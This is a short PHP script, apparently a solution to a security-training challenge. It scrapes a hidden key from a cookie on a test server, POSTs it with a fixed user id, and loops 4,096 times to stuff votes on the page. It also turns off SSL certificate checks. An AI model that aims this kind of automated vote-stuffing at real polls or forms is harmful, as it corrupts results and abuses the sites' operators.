<?php

function curl($url){
     /**
     *Create a conexion, scrapes the key and POST the form
     */
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_HEADER, 1);

     /*Getting and printing the html source*/
     $source = curl_exec($ch);
     /*echo $source, "\n";*/

     /*Getting cookie is the same as key*/
     preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $source, $matches);
     $cookies = array();
     foreach($matches[1] as $item){
     parse_str($item, $cookie);
     $cookies = array_merge($cookies, $cookie);
			 }
     echo "cookies:\n";
     $f_key = $cookies['HoldTheDoor'];
     /*Building the POST request*/
     $query = "id=1305&holdthedoor=Submit&key=";
     $query .= $f_key;

     curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: HoldTheDoor=".$f_key));
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
     $response = trim(curl_exec($ch));
     curl_close($ch);
     return $response;
     /*echo $query, "\n";*/
}

function vote(){

     $res = curl("http://158.69.76.135/level1.php");
     if ($res == "See you later hacker! [5]"){
     echo $res, "\n";
     } else {
     	   echo "\033[32mSuccess\033[0m", "\n";
     }

}

for ($i = 0; $i < 4096; $i++)
{
	vote();
	echo "vote #", $i + 1, "\n";
}


?>